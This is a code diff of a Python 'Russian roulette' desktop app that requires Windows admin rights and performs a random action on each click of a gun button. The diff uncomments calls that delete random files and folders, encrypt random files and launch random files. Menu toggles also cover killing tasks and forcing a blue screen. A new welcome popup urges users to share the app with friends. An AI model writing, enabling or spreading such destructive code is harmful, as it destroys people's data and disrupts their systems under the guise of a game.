@@ -161,35 +161,41 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
         win.deiconify()
 
-    ##########
-    # IN DEV #
-    ##########
+    def CommingSoon():
+        global text_action, color
+        text_action = "Comming Soon !"
+        color = "#0E5395"
 
-    def SettingsSaveWrite():
+    def SettingsSaveWrite(k):
         
         global settings, save_settings
         
-        print(save_settings)
+        settings["save_settings"][k] = save_settings[k].get()
+            
+        with open("settings.json", "w") as j: json.dump(settings, j, indent=4)
+           
+    def ClosePopup():
         
-        for k, b in save_settings.items(): settings["save_settings"][k] = b.get()
-            
-        with open("settings.json", "w") as j:
-            json.dump(settings, j, indent=4)
-            
-        with open("settings.json", "r") as j:
-            settings = json.load(j)
-            save_settings = settings["save_settings"]
+        global settings
         
-        for k, b in save_settings.items(): 
-            ex = BooleanVar()
-            ex.set(b)
-            save_settings[k] = ex
+        settings["first_start"] = False
+        
+        with open("settings.json", "w") as f: json.dump(settings, f, indent=4)
+        
+        link.destroy()
+        main_canvas.delete("all")
+        LoadApp()
             
-        print(save_settings)
-
-    ##########
-    # IN DEV #
-    ##########
+    def LoadApp():
+        main_canvas.create_window(round(mcw / 2), 375, window=gun_button)
+        options_menu.add_command(label="Percentages", command=CommingSoon)
+        options_menu.add_checkbutton(label="Deleting", onvalue=True, offvalue=False, variable=save_settings["Deleting"], selectcolor="red", command=lambda: SettingsSaveWrite("Deleting"))
+        options_menu.add_checkbutton(label="Encrypting", onvalue=True, offvalue=False, variable=save_settings["Encrypting"], selectcolor="red", command=lambda: SettingsSaveWrite("Encrypting"))
+        options_menu.add_checkbutton(label="Starting", onvalue=True, offvalue=False, variable=save_settings["Starting"], selectcolor="red", command=lambda: SettingsSaveWrite("Starting"))
+        options_menu.add_checkbutton(label="Creating", onvalue=True, offvalue=False, variable=save_settings["Creating"], selectcolor="red", command=lambda: SettingsSaveWrite("Creating"))
+        options_menu.add_checkbutton(label="Taskkill", onvalue=True, offvalue=False, variable=save_settings["Taskkill"], selectcolor="red", command=lambda: SettingsSaveWrite("Taskkill"))
+        options_menu.add_checkbutton(label="BSOD", onvalue=True, offvalue=False, variable=save_settings["Bsod"], selectcolor="red", command=lambda: SettingsSaveWrite("Bsod"))
+        options_menu.add_checkbutton(label="Nothing", onvalue=True, offvalue=False, variable=save_settings["Nothing"], selectcolor="red", command=lambda: SettingsSaveWrite("Nothing"))
 
     def onClick():
         
@@ -210,15 +216,15 @@ if ctypes.windll.shell32.IsUserAnAdmin():
                 color = "#cfcfb8"
                 break
             elif 0.2 < rda <= 0.4 and save_settings["Deleting"].get():
-                # text_action = delAll(rndFile(folder=True, file=True))
+                text_action = delAll(rndFile(folder=True, file=True))
                 color = "#E20808"
                 break
             elif 0.4 < rda <= 0.5 and save_settings["Encrypting"].get():
-                # text_action = cptFile(rndFile(file=True))
+                text_action = cptFile(rndFile(file=True))
                 color = "#E208B4"
                 break
             elif 0.5 < rda <= 0.7 and save_settings["Starting"].get():
-                # text_action = strFile(rndFile(file=True))
+                text_action = strFile(rndFile(file=True))
                 color = "#42BF20"
                 break
             elif 0.7 < rda <= 0.8 and save_settings["Creating"].get():
@@ -232,7 +238,6 @@ if ctypes.windll.shell32.IsUserAnAdmin():
             else:
                 c = True
                 for v in save_settings.values():
-                    print(v.get())
                     if v.get():
                         c = False
                 if c:
@@ -250,6 +255,16 @@ if ctypes.windll.shell32.IsUserAnAdmin():
     window.geometry(f"{ww}x{wh}")
     window.maxsize(ww, wh)
     window.minsize(ww, wh)
+    
+    with open("settings.json", "r") as j: 
+        settings = json.load(j)
+    save_settings = dict(settings["save_settings"])
+    first_start = bool(settings["first_start"])
+    
+    for k, b in save_settings.items(): 
+        ex = BooleanVar()
+        ex.set(b)
+        save_settings[k] = ex
 
     mcw = round(ww / 1.3636363636363636363636363636364)
     mch = round(wh / 1)
@@ -257,48 +272,24 @@ if ctypes.windll.shell32.IsUserAnAdmin():
     list_canvas = Canvas(window, width=lcw, height=mch, highlightthickness=0, bg='#292926')
     main_canvas = Canvas(window, width=mcw, height=mch, highlightthickness=0, bg='#4e4e47')
     
-    ##################
-    # CONTINUER ICI #
-    #################
-    
-    with open("settings.json", "r") as j:
-        settings = json.load(j)
-        save_settings = settings["save_settings"]
-    
-    for k, b in save_settings.items(): 
-        ex = BooleanVar()
-        ex.set(b)
-        save_settings[k] = ex
-    
     menu = Menu(window, tearoff=0)
     window.config(menu=menu)
     options_menu = Menu(menu, tearoff=0, bg='#292926', fg="white")
     others_menu = Menu(menu, tearoff=0, bg='#292926', fg="white")
-    
     menu.add_cascade(label="Options", menu=options_menu)
     menu.add_cascade(label="Others", menu=others_menu)
-    
-    options_menu.add_command(label="Percentages", command=lambda: print("Pourcentage"))
     others_menu.add_command(label="About...", command=lambda: webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie"))
+    options_menu.add_checkbutton(label="Sounds", onvalue=True, offvalue=False, variable=save_settings["Sounds"], selectcolor="red", command=lambda: SettingsSaveWrite("Sounds"))
     
-    options_menu.add_checkbutton(label="Sounds", onvalue=True, offvalue=False, variable=save_settings["Sounds"], selectcolor="red")
-    options_menu.add_checkbutton(label="Deleting", onvalue=True, offvalue=False, variable=save_settings["Deleting"], selectcolor="red")
-    options_menu.add_checkbutton(label="Encrypting", onvalue=True, offvalue=False, variable=save_settings["Encrypting"], selectcolor="red")
-    options_menu.add_checkbutton(label="Starting", onvalue=True, offvalue=False, variable=save_settings["Starting"], selectcolor="red")
-    options_menu.add_checkbutton(label="Creating", onvalue=True, offvalue=False, variable=save_settings["Creating"], selectcolor="red")
-    options_menu.add_checkbutton(label="Taskkill", onvalue=True, offvalue=False, variable=save_settings["Taskkill"], selectcolor="red")
-    options_menu.add_checkbutton(label="BSOD", onvalue=True, offvalue=False, variable=save_settings["Bsod"], selectcolor="red")
-    options_menu.add_checkbutton(label="Nothing", onvalue=True, offvalue=False, variable=save_settings["Nothing"], selectcolor="red")
-    
-    ##################
-    # CONTINUER ICI #
-    #################
-
     shot_audio = simpleaudio.WaveObject.from_wave_file("shot.wav")
     gun = PhotoImage(file="gun.png")
     gunshot = PhotoImage(file="gunshot.png")
     gun_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=onClick, relief=FLAT, image=gun, borderwidth=0)
-    main_canvas.create_window(round(mcw / 2), 375, window=gun_button)
+
+    link = Label(window, text="Github", fg="blue", bg="#697783", cursor="hand2", font=("Cascadia Code SemiLight", 15))
+    title = Label(window, text="Hey you ! Thank you for downloading this app !", fg="#283747", font=("Carlito", 30, "underline"), bg="#697783")
+    sl = Label(window, font=("Cascadia Code SemiLight", 15), bg="#697783", fg="#D8D3E3", text="For more info or help you can take a look on the       .\nDon't hesitate to share the app with your friends and suggest changes !")
+    ok_button = Button(window, relief=FLAT, bg="#24B7C1", border=0, height=5, width=30, fg="#262828", text="I'm ok !", font=("Cascadia Mono", 10), activeforeground="#BCC9CA", activebackground="#1ACCD8", command=ClosePopup)
 
     h = 0
     le = round((ww * wh) / 72000)
@@ -310,8 +301,19 @@ if ctypes.windll.shell32.IsUserAnAdmin():
 
     main_canvas.place(x=0, y=0)
     list_canvas.place(x=mcw, y=0)
+    
+    if not first_start:
+        LoadApp()
         
-        
+    else:
+        main_canvas.create_rectangle(mcw/2-mcw/2.5, mch/2-mch/2.75, mcw/2+mcw/2.5, mch/2+mch/2.75, fill="#697783", width=round(ww*wh/108000), outline='#202225')
+        main_canvas.create_window(mcw/2, mch/2-210, window=title)
+        main_canvas.create_window(mcw/2, mch/2-125, window=sl)
+        main_canvas.create_window(mcw/2, mch/2+175, window=ok_button)
+        link.place(x=795, y=mch/2-154)
+        link.bind("<Button-1>", lambda e: webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie"))
+        link.lift()
+           
     while True:
         
         try:
@@ -320,7 +322,6 @@ if ctypes.windll.shell32.IsUserAnAdmin():
                 h += le
                 if h >= mch:
                     list_canvas.delete("all")
-                    window.update()
                     h = le
                 if len(text_action) > linejmp: 
                     list_canvas.create_text(0, h, text=f">  {text_action[:linejmp]}", font=('Consolas', ps), fill=color, anchor="w")
